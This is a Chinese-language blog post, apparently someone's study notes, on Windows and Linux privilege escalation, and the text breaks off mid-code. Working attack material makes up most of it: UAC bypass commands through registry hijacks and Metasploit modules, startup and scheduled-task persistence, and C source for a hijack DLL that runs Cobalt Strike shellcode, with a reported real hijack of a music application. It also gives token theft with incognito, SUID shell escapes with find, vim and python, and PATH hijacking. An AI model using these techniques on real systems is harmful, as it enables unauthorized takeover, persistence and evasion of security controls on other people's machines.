title="计划任务提权"></a>计划任务提权</h3><p>设置计划任务配置不当，导致可以劫持然后替换成自己的恶意文件进行提权</p><p>就是普通用户能修改计划任务，将计划任务本来要运行的程序改掉了,并且需要计划任务在高权限运行</p><p>但是极可能不知道计划任务运行的是哪个，所以这个只能去猜，另外还有个命令能查询计划任务，但是低权限用户无法查询到高权限的计划任务，所以这个也看运气</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks <span class="operator">/</span>query <span class="operator">/</span>fo LIST <span class="operator">/</span>v</span><br></pre></td></tr></table></figure><p>查看用户的权限(需要上传accesschk文件)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">accesschk apache <span class="operator">-</span>cw <span class="operator">*</span> <span class="operator">/</span>accepteula</span><br></pre></td></tr></table></figure><h3 id="启动项提权"><a href="#启动项提权" class="headerlink" title="启动项提权"></a>启动项提权</h3><p>开机自启程序</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">启动文件夹</span><br><span class="line">C:\ProgramData\Microsoft\Windows\<span class="keyword">Start</span> Menu\Programs\Startup</span><br><span class="line">C:\Users\用户名\AppData\Romaing\Microsoft\Windows\<span class="keyword">Start</span> Menu\Programs\<span class="keyword">Start</span></span><br></pre></td></tr></table></figure><p>启动注册表(windows11、windows10里面很多都没有，下面的主要是windows7里面的)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\<span class="keyword">Current</span>\Version\Policies\Explorer\Run </span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\<span class="keyword">Current</span>\Version\RunServicesOnce </span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\<span class="keyword">Current</span>\Version\Run\ServicesOnce </span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Services </span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\<span class="keyword">Current</span>\Version\RunServices </span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\<span class="keyword">Current</span>\Version\Run\Oncel\Setup </span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWAREMicrosoft\Windows\<span class="keyword">Current</span>\Version\Run\Once\Setup </span><br><span class="line">HKEY_LOCAL_MACHINE\SOFT\WAREMicrosoft\Windows\CurrentVersion\RunOnce </span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\<span class="keyword">Current</span>\Version\RunOnce </span><br><span class="line">HKEY_CURRENT_USER\SoftwarelMicrosoft\Windows\<span class="keyword">Current</span>\Version\Run </span><br><span class="line">HKEY_LOCAL_MACHINE\SOFT\WARE\Microsoft\Windows\<span class="keyword">Current</span>\Version\Run </span><br></pre></td></tr></table></figure><p>查询文件夹权限</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell accesschk.exe &quot;C:\ProgramData\Microsoft\Windows\Start </span><br><span class="line">Menu\Programs\Startup&quot;</span><br></pre></td></tr></table></figure><p>复制文件到目录，然后等待重启即可</p><h2 id="Uac认证"><a href="#Uac认证" class="headerlink" title="Uac认证"></a>Uac认证</h2><p>UAC为用户账户控制，在做很多操作的时候会蹦出来妨碍你，由于我们没有图形化界面，没法点击，所以这个时候就得绕过</p><p><img src="/./../image/%E6%8F%90%E6%9D%83/1729157716058-3.png" alt="img"></p><p><img src="/./../image/%E6%8F%90%E6%9D%83/1729157716058-4.png" alt="img"></p><p>就是我们电脑偶尔要点击</p><p>你要允许此应用对你的设备进行更改吗，的这个东西</p><p>触发</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">安装或卸载程序</span><br><span class="line">安装驱动设备</span><br><span class="line">增加或修改注册表</span><br><span class="line">改变UAC设置</span><br><span class="line">增加或删除用户账户</span><br><span class="line">改变用户的账户类型</span><br><span class="line">修改Windows <span class="keyword">Update</span>配置</span><br><span class="line">将文件复制或移动到Program Files或者windows目录</span><br></pre></td></tr></table></figure><p><img src="/./../image/%E6%8F%90%E6%9D%83/1729157716058-5.png" alt="img"></p><h3 id="CS绕过UAC-好用"><a href="#CS绕过UAC-好用" class="headerlink" title="CS绕过UAC(好用)"></a>CS绕过UAC(好用)</h3><p>上cs后提权一键绕过即可</p><h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><p>前面讲到的配置错误里面，计划任务和注册表都是可以不经过uac认证的，所以如果可以的话，这个也是一个思路</p><h3 id="msf过UAC"><a href="#msf过UAC" class="headerlink" title="msf过UAC"></a>msf过UAC</h3><p>当前用户必须是管理员组内用户，uac为默认设置即可 </p><p>上线之后去handler里面找</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">search</span> bypassuac</span><br><span class="line"><span class="keyword">user</span> x</span><br><span class="line"><span class="keyword">set</span> session x</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h3 id="RUNAS提权"><a href="#RUNAS提权" class="headerlink" title="RUNAS提权"></a>RUNAS提权</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exploit<span class="operator">/</span>windows<span class="operator">/</span><span class="keyword">local</span><span class="operator">/</span>ask</span><br><span class="line"><span class="keyword">set</span> session x</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>向对面电脑弹个框，如果对面点击是，则直接拿shell</p><h2 id="基于白名单DLL劫持绕过"><a href="#基于白名单DLL劫持绕过" class="headerlink" title="基于白名单DLL劫持绕过"></a>基于白名单DLL劫持绕过</h2><p>dll是动态链接库，又称为”应用程序拓展”，为软件文件类型。在windows中许多应用程序并不是一个完整的可执行文件，它们被分割成一些相对独立的动态链接库文件，即dll文件，类似于编程中的用import 导入的模块</p><p><strong>原理</strong></p><p>当进程尝试加载加载一个Dll但是没有指定dll绝对路径的时候，windows会尝试指定目录下查找该dll，如果攻击者能控制其中一个目录，并且放一个恶意dll到此目录下，该恶意dll就会被进程加载，并执行</p><p><strong>顺序</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">应用程序加载的目录</span><br><span class="line">C:\Windows\System32</span><br><span class="line">C:\Windows\<span class="keyword">System</span></span><br><span class="line">C:\Windows</span><br><span class="line">加载DLL时所在的当前目录</span><br><span class="line">PATH环境变量中列出的目录</span><br></pre></td></tr></table></figure><p>Know DLL注册表项</p><p>在windows7之后，windows为了防御dll劫持，将容易被劫持的系统dll写入了注册表项中，那么反思此项目下的dll文件就会被禁止从exe自身所在的目录下进行调用，只能从系统目录即system32目录下进行调用</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\<span class="keyword">SYSTEM</span>\CurrentControlSet\Control\Session Manager\KnownDLLs</span><br></pre></td></tr></table></figure><p>只能从system32调用，其他任何，比如应用程序加载的目录都不能调用此同名文件</p><p>昂，如果说java在除c盘外的其他盘，但java运行需要调用本目录的dll，那么那个dll由于在其他盘所以应该能被篡改，那么就能被劫持上线,还有转发dll</p><p>现将操作本地执行，使用procmon进行监控，过滤DLL和name not found ，查询可以替换的dll文件，注意文件的权限是否可以在目录写入，如果都ok，进行写入即可</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Replace &quot;dll.h&quot; with the name of your header */</span> </span><br><span class="line">#include &quot;dll.h&quot; </span><br><span class="line">#include <span class="operator">&lt;</span>windows.h<span class="operator">&gt;</span> </span><br><span class="line">#include <span class="operator">&lt;</span>stdlib.h<span class="operator">&gt;</span> </span><br><span class="line">BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason,LPVOID lpvReserved) </span><br><span class="line">&#123; </span><br><span class="line">switch(fdwReason) </span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_ATTACH: </span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">system</span>(&quot;cmd.exe&quot;); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_DETACH: </span><br><span class="line">&#123; </span><br><span class="line">break; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_ATTACH: </span><br><span class="line">&#123; </span><br><span class="line">break; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_DETACH: </span><br><span class="line">&#123; </span><br><span class="line">break; </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">/* Return TRUE on success, FALSE on failure */</span> </span><br><span class="line"><span class="keyword">return</span> <span class="literal">TRUE</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或者说，这里的shellcode是从cs生成的shellcode，根据cs生成的实际内容进行修改即可，这里编译运行即可获得dll，然后改名放到那个目录，然后再运行程序即可</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Replace &quot;dll.h&quot; with the name of your header */</span> </span><br><span class="line">#include &quot;dll.h&quot; </span><br><span class="line">#include <span class="operator">&lt;</span>windows.h<span class="operator">&gt;</span> </span><br><span class="line">#include <span class="operator">&lt;</span>stdlib.h<span class="operator">&gt;</span> </span><br><span class="line">HANDLE hThread <span class="operator">=</span> <span class="keyword">NULL</span>; </span><br><span class="line">typedef void(__stdcall<span class="operator">*</span> JMP_SHELLCODE)(); </span><br><span class="line">unsigned <span class="type">char</span> shellcode[<span class="number">800</span>] <span class="operator">=</span> &#123;<span class="number">0Xfc</span>,<span class="number">0</span>xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx,<span class="number">0X00</span> </span><br><span class="line">&#125;; </span><br><span class="line">DWORD WINAPI jmp_shellcode(LPVOID pPara) </span><br><span class="line">&#123; </span><br><span class="line">LPVOID lpBase <span class="operator">=</span> VirtualAlloc(<span class="keyword">NULL</span>, sizeof(shellcode), MEM_COMMIT, </span><br><span class="line">PAGE_EXECUTE_READWRITE); </span><br><span class="line">memcpy(lpBase, shellcode, sizeof(shellcode)); </span><br><span class="line">JMP_SHELLCODE jmp_shellcode <span class="operator">=</span> (JMP_SHELLCODE)lpBase; </span><br><span class="line">jmp_shellcode();接下来运行白名单程序，可以看待提权成功，绕过了UAC认证 </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125; </span><br><span class="line">BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason,LPVOID lpvReserved) </span><br><span class="line">&#123; </span><br><span class="line">switch(fdwReason) </span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_ATTACH: </span><br><span class="line">&#123; </span><br><span class="line">hThread <span class="operator">=</span> CreateThread(<span class="keyword">NULL</span>, <span class="number">0</span>, jmp_shellcode, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_DETACH: </span><br><span class="line">&#123; </span><br><span class="line">break; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_ATTACH: </span><br><span class="line">&#123; </span><br><span class="line">break; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_DETACH: </span><br><span class="line">&#123; </span><br><span class="line">break; </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">/* Return TRUE on success, FALSE on failure */</span> </span><br><span class="line"><span class="keyword">return</span> <span class="literal">TRUE</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后的话，这次是跟着免杀训练走了一下网易云的dll劫持，我的版本是3.0.18</p><p>生成了一个dll文件，叫profapi.dll，然后能直接过并且不报错，我也不知道为什么这个能不报错,这里已经是成功白加黑上线cs了</p><p><img src="/./../image/%E6%8F%90%E6%9D%83/1729157716058-6.png" alt="img"></p><p>并且没有看见师傅讲课时讲的stack里面调用动态链接库，只看见调用了其他的东西，不清楚是哪部分能直接过这个程序</p><p><img src="/./../image/%E6%8F%90%E6%9D%83/1729157716058-7.png" alt="img"></p><p><img src="/./../image/%E6%8F%90%E6%9D%83/1729157716058-8.png" alt="img"></p><p>至于师傅又讲到的aheadlib进行转发函数，很感兴趣，但是手头缺工具，打算下周再弄了</p><p>至于DLLmain死锁，确实是我没有注意过的，这个应该就是导致我前面改成其他dll名然后报错的原因吧，在进程调用到这里的时候本身有一个创建新进程，导致一堆报错，或者没找到函数</p><p><img src="/./../image/%E6%8F%90%E6%9D%83/1729157716058-9.png" alt="img"></p><h2 id="基于白名单的AutoElevate绕过"><a href="#基于白名单的AutoElevate绕过" class="headerlink" title="基于白名单的AutoElevate绕过"></a>基于白名单的AutoElevate绕过</h2><p>原理</p><p>利用白名单程序的本质上是劫持注册表，能主动寻找autoelevated属性为true的程序，修改其注册表command的值改成我们想执行的payload，该值中的字段会在程序运行的时候自动执行，类似于默认程序打开，以后运行该程序的时候，这个command命令都会自动执行</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKCU\Software\Classes\mscfile\shell\<span class="keyword">open</span>\commend   <span class="operator">/</span><span class="operator">/</span>一般来说得自己添加</span><br></pre></td></tr></table></figure><p>UAC同样也会对程序本身造成影响，微软不希望运行系统程序也过UAC，所以对一些系统程序添加了白名单机制</p><p>常见白名单：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msconfig.exe</span><br><span class="line">taskmgr.exe</span><br><span class="line">perfmon.exe</span><br><span class="line">cleanmgr.exe</span><br><span class="line">sdclt.exe</span><br><span class="line">dccw.exe</span><br><span class="line">eventvwr.exe</span><br><span class="line">computerdefaults.exe</span><br><span class="line">fodhelper.exe</span><br></pre></td></tr></table></figure><p>注册表添加(即使没过UAC也是可以修改注册表的)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg <span class="keyword">add</span> HKCU\Software\Classes\mscfile\shell\<span class="keyword">open</span>\command <span class="operator">/</span>ve <span class="operator">/</span>t REG_SZ <span class="operator">/</span>d &quot;cmd.exe /c calc&quot;</span><br><span class="line">reg <span class="keyword">add</span> HKCU\Software\Classes\mscfile\shell\<span class="keyword">open</span>\command <span class="operator">/</span>v DelegateExecute <span class="operator">/</span>t REG＿SZ</span><br></pre></td></tr></table></figure><p>然后运行那个应用即可</p><h3 id="CVE-2019-1388-UAC"><a href="#CVE-2019-1388-UAC" class="headerlink" title="CVE-2019-1388 UAC"></a>CVE-2019-1388 UAC</h3><p>windows证书对话框特权提升漏洞，是因为UAC机制的设定不严导致的，默认情况下，windows UAC提示本身为consent.exe可执行文件生成，导致NT AUTHORITY\system身份运行并且有system完整性水平。由于用户可以与此UI进行交互。所以有必要对UI进行严格限制。否则低权限用户可能通过UI操作提权到system</p><p><img src="/./../image/%E6%8F%90%E6%9D%83/1729157716058-10.png" alt="img"></p><p>超链接打开浏览器，然后后续的权限都是以system来跑的，导致权限被滥用</p><p>可以打开浏览器，然后找到一个能开文件管理器的位置，然后开一个cmd，就行</p><h3 id="Windows令牌概述和令牌窃取攻击-其实没什么用，作为计划任务的替代品"><a href="#Windows令牌概述和令牌窃取攻击-其实没什么用，作为计划任务的替代品" class="headerlink" title="Windows令牌概述和令牌窃取攻击(其实没什么用，作为计划任务的替代品)"></a>Windows令牌概述和令牌窃取攻击(其实没什么用，作为计划任务的替代品)</h3><p>getsystem命令也是这种方法</p><p>Windows令牌</p><p>令牌(Token)是系统的临时密钥，相对于账户名和密码，用于访问是否允许这次请求和判断这次的请求是属于哪一个用户的，不允许在不提供密码或其他凭证的前提下，访问网络和系统资源，这些令牌持续存在直到电脑重启</p><p>随机，不可预测</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">访问令牌(Access Token):表示访问控制主题的系统对象</span><br><span class="line">会话令牌(Session Token):是交互会话中唯一的身份标识符，可以理解为web的token</span><br><span class="line">密保令牌(Security Token):认证令牌或者硬件令牌，计算机身份校验的物理设备</span><br></pre></td></tr></table></figure><p>访问令牌包含以下内容</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">用户账户的安全标识(SID)</span><br><span class="line">用户所属的组SID</span><br><span class="line">用于标识当前登陆会话的登陆SID</span><br><span class="line">用户或用户组所拥有的权限列表</span><br><span class="line">所有者SID</span><br><span class="line">主要组SID</span><br><span class="line">访问控制列表</span><br><span class="line">访问令牌的主要来源</span><br><span class="line">令牌是主要令牌还是模拟令牌</span><br><span class="line">限制SID的可选列表</span><br><span class="line">目前的模拟等级</span><br><span class="line">其他统计的数据</span><br></pre></td></tr></table></figure><p>Windows访问令牌有两种</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Delegation Token：授权令牌，支持交互式会话登录（本地用户直接登录、远程桌面登录）</span><br><span class="line">Impresonation Token:模拟令牌，支持非交互的会话</span><br></pre></td></tr></table></figure><p> 只有在系统重启后才会清除，当授权令牌用户注销后，授权令牌自动变成模拟令牌</p><p>令牌窃取</p><p>incognito.exe</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">incognito.exe list_tokens <span class="operator">-</span>u  <span class="operator">/</span><span class="operator">/</span>列出用户令牌</span><br><span class="line">incognito.exe <span class="keyword">execute</span> <span class="operator">-</span>c &quot;令牌&quot;程序名 使用窃取的令牌执行命令</span><br><span class="line">incognito.exe <span class="keyword">execute</span> <span class="operator">-</span>c &quot;NT AUTHORITY\SYSTEM&quot;  cmd.exe</span><br></pre></td></tr></table></figure><p>没过uac只能拿到自己的账户令牌，过了uac才能提权</p><p>直接执行命令达到权限</p><h1 id="linux提权"><a href="#linux提权" class="headerlink" title="linux提权"></a>linux提权</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">赋予了文件权限</span><br><span class="line">使用sudo查看</span><br><span class="line">cat等命令赋予了SUID权限</span><br></pre></td></tr></table></figure><p>内核提权是linux内核的漏洞进行提权。内核漏洞进行提权一般包括三个环节：</p><p>1.对目标系统进行信息收集，获取到系统内核信息以及版本信息；</p><p>2.根据内核版本获取其对应的漏洞以及EXP</p><p>3.使用找到EXP对目标系统发起攻击，完成提权操作</p><h2 id="查看Linux操作系统的内核版本和相关信息"><a href="#查看Linux操作系统的内核版本和相关信息" class="headerlink" title="查看Linux操作系统的内核版本和相关信息"></a>查看Linux操作系统的内核版本和相关信息</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat <span class="operator">/</span>etc<span class="operator">/</span>issue 查看ubuntu或者centos的版本</span><br><span class="line">cat <span class="operator">/</span>etc<span class="comment">/*-release 查看centos版本</span></span><br><span class="line"><span class="comment">uname -a 查看系统全部信息</span></span><br><span class="line"><span class="comment">uname -r 查看内核版本</span></span><br></pre></td></tr></table></figure><p>使用searchsploit能查找内核exp</p><p>searchsploit -m 44641.c</p><p><img src="/./../image/%E6%8F%90%E6%9D%83/1729157716058-11.png" alt="img"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc <span class="operator">-</span>o xxx <span class="number">44641.</span>c <span class="operator">/</span><span class="operator">/</span>将<span class="number">44641.</span>c编译成xxx</span><br></pre></td></tr></table></figure><p>suid文件为&#x2F;usr&#x2F;bin&#x2F;su</p><h2 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h2><p>suid是一种特殊权限，设置了suid的程序文件，在用户执行程序时候，用户的权限是该程序文件属主的权限，例如程序文件的属主是root，执行该程序的用户暂时在这件事上获得root权限。sgid与suid类似，只是执行程序时获得的是文件属组的权限。passwd这个命令程序的权限设置是suid</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">只有二进制文件设置suid才有意义</span><br><span class="line">命令执行者需要对该文件有执行权限</span><br><span class="line">命令执行者短暂获得此身份，只有在执行此程序的时候获取相对应的身份</span><br></pre></td></tr></table></figure><p>设置SUID</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod u<span class="operator">+</span>s filename 设置SUID位</span><br><span class="line">chmod u<span class="operator">-</span>s filename 去掉SUID设置</span><br></pre></td></tr></table></figure><h2 id="查找SUID文件"><a href="#查找SUID文件" class="headerlink" title="查找SUID文件"></a>查找SUID文件</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find <span class="operator">/</span> <span class="operator">-</span><span class="keyword">user</span> root <span class="operator">-</span>perm <span class="number">-4000</span> <span class="operator">-</span>print <span class="number">2</span><span class="operator">&gt;</span><span class="operator">/</span>dev<span class="operator">/</span><span class="keyword">null</span></span><br><span class="line">find <span class="operator">/</span> <span class="operator">-</span>perm <span class="operator">-</span>u<span class="operator">=</span>s <span class="operator">-</span>type f <span class="number">2</span><span class="operator">&gt;</span><span class="operator">/</span>dev<span class="operator">/</span><span class="keyword">null</span></span><br><span class="line">find <span class="operator">/</span> <span class="operator">-</span><span class="keyword">user</span> root <span class="operator">-</span>perm <span class="number">-4000</span> <span class="operator">-</span><span class="keyword">exec</span> ls &#123;&#125; \; <span class="number">2</span><span class="operator">&gt;</span><span class="operator">/</span>dev<span class="operator">/</span><span class="keyword">null</span></span><br></pre></td></tr></table></figure><h3 id="使用find提权"><a href="#使用find提权" class="headerlink" title="使用find提权"></a>使用find提权</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find xxx <span class="operator">-</span><span class="keyword">exec</span> whoami \;</span><br><span class="line">find . <span class="operator">-</span><span class="keyword">exec</span> <span class="operator">/</span>bin<span class="operator">/</span>sh <span class="operator">-</span>p \; <span class="operator">-</span>quit</span><br></pre></td></tr></table></figure><h3 id="使用bash提权"><a href="#使用bash提权" class="headerlink" title="使用bash提权"></a>使用bash提权</h3><p>如果配置为suid权限</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find <span class="operator">/</span> <span class="operator">-</span><span class="keyword">user</span> root <span class="operator">-</span>perm <span class="number">-4000</span> <span class="operator">-</span>print <span class="number">2</span><span class="operator">&gt;</span><span class="operator">/</span>dev<span class="operator">/</span><span class="keyword">null</span></span><br><span class="line">bash <span class="operator">-</span>p <span class="operator">/</span><span class="operator">/</span>执行交互式root窗口</span><br></pre></td></tr></table></figure><h3 id="Vim提权"><a href="#Vim提权" class="headerlink" title="Vim提权"></a>Vim提权</h3><p>1.修改&#x2F;etc&#x2F;passwd和&#x2F;etc&#x2F;shadow</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ad7t5uIalqMws   密码为Password<span class="variable">@973</span> 盐为addedsalt</span><br></pre></td></tr></table></figure><p>2.vim打开交互shell</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim <span class="operator">-</span>c <span class="string">&#x27;:py import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-pc&quot;, &quot;reset; exec sh -p&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="python提权"><a href="#python提权" class="headerlink" title="python提权"></a>python提权</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python <span class="operator">-</span>c <span class="string">&#x27;import os;os.execl(&quot;/bin/sh&quot;,&quot;sh&quot;,&quot;-p&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="计划任务-1"><a href="#计划任务-1" class="headerlink" title="计划任务"></a>计划任务</h2><p>可能是权限配置不当，计划任务以root运行，低权限可以修改计划任务文件或内容</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">crontab <span class="operator">-</span>e 编辑计划任务</span><br><span class="line">crontab <span class="operator">-</span>l 查看计划任务</span><br><span class="line">crontab <span class="operator">-</span>r 删除当前crontab</span><br></pre></td></tr></table></figure><p>计划任务文件夹在 &#x2F;etc&#x2F;cron下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">*</span><span class="operator">/</span><span class="number">1</span> <span class="operator">*</span> <span class="operator">*</span> <span class="operator">*</span> <span class="operator">*</span> root <span class="operator">/</span>bash_os.sh </span><br></pre></td></tr></table></figure><p>上线后直接去&#x2F;etc&#x2F;crontab中查看文件，并查看权限，看可不可以改</p><h3 id="环境变量劫持-比较有用"><a href="#环境变量劫持-比较有用" class="headerlink" title="环境变量劫持(比较有用)"></a>环境变量劫持(比较有用)</h3><p>和windows的path劫持一样</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo $PATH查看环境变量</span><br></pre></td></tr></table></figure><p>shell文件有s&#x2F;root权限，然后里面调用了cat命令</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;/bin/bash&quot; <span class="operator">&gt;</span> <span class="operator">/</span>tmp<span class="operator">/</span>cat</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH<span class="operator">=</span><span class="operator">/</span>tmp:$PATH            <span class="operator">/</span><span class="operator">/</span>普通权限用户是允许添加临时环境变量的</span><br><span class="line">cd <span class="operator">/</span>home<span class="operator">/</span>shell</span><br><span 